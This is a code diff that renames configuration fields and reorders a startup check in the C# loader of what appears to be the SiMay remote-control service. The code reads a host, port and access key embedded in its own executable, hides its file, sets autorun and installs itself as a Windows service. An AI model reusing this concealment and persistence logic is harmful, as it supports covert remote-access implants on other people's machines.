@@ -78,15 +78,15 @@ namespace SiMay.RemoteService.Loader
                     Host = "127.0.0.1",
                     Port = 5200,
                     GroupName = "默认分组",
-                    RemarkInformation = "SiMayService远程管理",
-                    IsHide = false,
+                    DefaultDescribe = "SiMayService远程管理",
+                    HideExe = false,
                     IsMutex = false,
-                    IsAutoStart = false,
+                    AutoStart = false,
                     SessionMode = 0,
                     AccessKey = 5200,
-                    ServiceVersion = "正式5.0",
-                    RunTimeText = DateTime.Now.ToString(),
-                    UniqueId = "AAAAAAAAAAAAAAA11111111"
+                    Version = "正式5.0",
+                    RunTime = DateTime.Now,
+                    IdentifyId = "AAAAAAAAAAAAAAA11111111"
                 };
                 byte[] selfStartupBinary = File.ReadAllBytes(Application.ExecutablePath);
                 var flag = BitConverter.ToInt16(selfStartupBinary, selfStartupBinary.Length - sizeof(Int16));
@@ -99,15 +99,15 @@ namespace SiMay.RemoteService.Loader
                     var options = PacketSerializeHelper.DeserializePacket<ServiceOptions>(bytes);
                     _startParameter.Host = options.Host;
                     _startParameter.Port = options.Port;
-                    _startParameter.RemarkInformation = options.Remark;
-                    _startParameter.IsAutoStart = options.IsAutoRun;
-                    _startParameter.IsHide = options.IsHide;
+                    _startParameter.DefaultDescribe = options.DefaultDescrible;
+                    _startParameter.AutoStart = options.AutoStart;
+                    _startParameter.HideExe = options.HideExe;
                     _startParameter.AccessKey = options.AccessKey;
                     _startParameter.SessionMode = options.SessionMode;
-                    _startParameter.UniqueId = options.Id + $"_{Environment.MachineName}";
+                    _startParameter.IdentifyId = options.Id + $"_{Environment.MachineName}";
                     _startParameter.IsMutex = options.IsMutex;
                     _startParameter.GroupName = options.GroupName;
-                    _startParameter.InstallService = options.InstallService;
+                    _startParameter.AutoService = options.InstallService;
                     _startParameter.ServiceName = options.ServiceName;
                     _startParameter.ServiceDisplayName = options.ServiceDisplayName;
                 }
@@ -115,25 +115,27 @@ namespace SiMay.RemoteService.Loader
                 if (_startParameter.IsMutex)
                 {
                     //进程互斥体
-                    Mutex MyMutex = new Mutex(true, $"{_startParameter.UniqueId}_SiMayService", out var bExist);
+                    Mutex MyMutex = new Mutex(true, $"{_startParameter.IdentifyId}_SiMayService", out var bExist);
                     if (!bExist)
                         Environment.Exit(0);
                 }
 
-                //是否服务安装
-                _startParameter.SystemPermission = args.Any(c => c.Equals(SERVICE_USER_START, StringComparison.OrdinalIgnoreCase));
-
-                if (_startParameter.IsHide)
+                if (_startParameter.HideExe)
                     SystemSessionHelper.FileHide(true);
 
-                if (_startParameter.IsAutoStart)
+                if (_startParameter.AutoStart)
                     SystemSessionHelper.SetAutoRun(true);
 
-                if (args.Any(c => c.Equals(SERVICE_USER_START, StringComparison.OrdinalIgnoreCase)))
+                //是否服务安装
+                var serviceStart = args.Any(c => c.Equals(SERVICE_USER_START, StringComparison.OrdinalIgnoreCase));
+                if (serviceStart)
+                {
+                    _startParameter.SystemPermission = serviceStart;
                     new UserTrunkContext(args);
+                }
 
                 //非SYSTEM用户进程启动则进入安装服务
-                if (_startParameter.InstallService && !args.Any(c => c.Equals(SERVICE_USER_START, StringComparison.OrdinalIgnoreCase)))
+                if (_startParameter.AutoService && !args.Any(c => c.Equals(SERVICE_USER_START, StringComparison.OrdinalIgnoreCase)))
                     SystemSessionHelper.InstallAutoStartService(_startParameter.ServiceName, _startParameter.ServiceDisplayName);
 
                 Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);
